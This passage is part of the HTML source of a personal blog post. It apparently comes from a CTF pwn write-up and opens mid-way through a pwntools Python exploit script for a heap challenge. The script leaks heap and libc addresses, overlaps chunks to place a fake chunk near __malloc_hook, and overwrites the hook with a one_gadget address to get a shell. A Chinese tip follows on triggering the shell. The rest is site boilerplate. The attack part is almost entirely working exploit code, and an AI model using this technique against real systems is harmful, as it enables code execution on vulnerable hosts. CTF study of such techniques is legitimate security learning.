class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"size: "</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"info: "</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"choice: "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"choice: "</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0xf0</span><span class="number">-8</span>,<span class="string">'A'</span>*(<span class="number">0xf0</span><span class="number">-8</span>))</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x10</span><span class="number">-8</span>,<span class="string">'B'</span>*(<span class="number">0x10</span><span class="number">-8</span>))</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x100</span><span class="number">-8</span>,<span class="string">'C'</span>*(<span class="number">0x100</span><span class="number">-8</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x70</span><span class="number">-8</span>,<span class="string">'D'</span>*(<span class="number">0x70</span><span class="number">-8</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x100</span><span class="number">-8</span>,<span class="string">'D'</span>*<span class="number">7</span>)</span><br><span class="line">puts(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">"DDDDDDD"</span>)</span><br><span class="line">heap = u64(rc(<span class="number">7</span>)[<span class="number">1</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_addr--&gt;"</span> + hex(heap)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0xf0</span><span class="number">-8</span>,<span class="string">'A'</span>*<span class="number">7</span>)</span><br><span class="line">puts(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">"AAAAAAA"</span>)</span><br><span class="line">malloc_hook = u64(rc(<span class="number">7</span>)[<span class="number">1</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"malloc_hook--&gt;"</span> + hex(malloc_hook)</span><br><span class="line">onegadget = malloc_hook - libc.symbols[<span class="string">"__malloc_hook"</span>] + <span class="number">0xf1147</span></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0xddf</span>)</span><br><span class="line">malloc(<span class="number">0</span>,heap+<span class="number">0x1</span>,<span class="string">'A'</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0xf0</span><span class="number">-8</span>,<span class="string">'A'</span>*(<span class="number">0xf0</span><span class="number">-8</span><span class="number">-1</span>))</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x70</span><span class="number">-8</span>,<span class="string">'B'</span>*(<span class="number">0x70</span><span class="number">-8</span><span class="number">-1</span>))</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x100</span><span class="number">-8</span>,<span class="string">'C'</span>*(<span class="number">0x100</span><span class="number">-8</span><span class="number">-1</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x10</span><span class="number">-8</span>,<span class="string">'B'</span>*<span class="number">7</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x100</span><span class="number">-8</span>,<span class="string">'A'</span>*<span class="number">7</span>)</span><br><span class="line">puts(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">"AAAAAAA"</span>)</span><br><span class="line">thread_arena_heap = u64(rc(<span class="number">7</span>)[<span class="number">1</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"thread_arena_heap---&gt;"</span> + hex(thread_arena_heap)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x70</span><span class="number">-8</span>,<span class="string">'E'</span>*(<span class="number">0x70</span><span class="number">-8</span><span class="number">-8</span>) + p64(<span class="number">0x160</span>))</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">'F'</span>*<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,thread_arena_heap+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">1</span>,<span class="string">'B'</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span><span class="number">-8</span>,<span class="string">'G'</span>*(<span class="number">0x100</span><span class="number">-8</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'A'</span>*<span class="number">0xe0</span> + p64(<span class="number">0xf0</span>) + p64(<span class="number">0x74</span>) + p64(fake_chunk)</span><br><span class="line">py = py.ljust(<span class="number">0x160</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x160</span>,py)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x70</span><span class="number">-8</span>,<span class="string">'AAAAAAA'</span>)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'A'</span>*<span class="number">0x13</span> + p64(onegadget)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x70</span><span class="number">-8</span>,py)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"choice: "</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">"index: "</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line">ru(<span class="string">"size: "</span>)</span><br><span class="line">sl(<span class="string">'10'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h5 id="记住最后需要一点主意，因为malloc调用时，输入size即可getshell，所以切记不要用集成函数了。"><a href="#记住最后需要一点主意，因为malloc调用时，输入size即可getshell，所以切记不要用集成函数了。" class="headerlink" title="记住最后需要一点主意，因为malloc调用时，输入size即可getshell，所以切记不要用集成函数了。"></a>记住最后需要一点主意，因为malloc调用时，输入size即可getshell，所以切记不要用集成函数了。</h5><p><img src="/blog_img/1565774754760.png" alt="1565774754760"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
